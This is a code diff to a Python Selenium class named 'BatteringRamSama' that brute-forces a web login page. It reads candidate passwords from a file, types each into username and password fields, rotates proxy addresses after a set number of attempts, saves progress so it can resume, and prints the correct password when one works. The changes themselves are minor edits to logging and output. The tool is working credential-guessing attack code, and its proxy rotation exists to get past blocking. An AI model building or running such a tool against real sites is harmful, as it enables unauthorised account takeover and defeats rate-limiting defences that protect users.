@@ -63,8 +63,7 @@ class BatteringRamSama():
                 if counter>=self.changeProxy:
                     if not first:
                         self.driver.close()        
-                    print(self.proxyAddresses[i])
-                    print(self.proxyPorts[i])
+
                     self.driver=changeProxy(self.proxyAddresses[i],self.proxyPorts[i])
                     try:
                         self.driver.get(self.signInPage)
@@ -86,7 +85,6 @@ class BatteringRamSama():
                 
                 if not badConn:
                     password=f.readline()
-                    print(password)
                     try:
                         usernameEle=self.driver.find_element_by_xpath(self.usernameXpath)
                         passwordEle=self.driver.find_element_by_xpath(self.passwordXpath)
@@ -107,7 +105,7 @@ class BatteringRamSama():
                     save=open("lastPassword.txt",'w')
                     save.write(password)
                     save.close()
-                    print("Attempt "+i)
+                    print("Attempt "+str(i))
             else:
                 password=f.readline()
                 if password==self.lastPassword:
@@ -115,6 +113,7 @@ class BatteringRamSama():
             
         f.close()
         self.driver.close()
+        print("Correct Password was "+ password)
                 
             
             
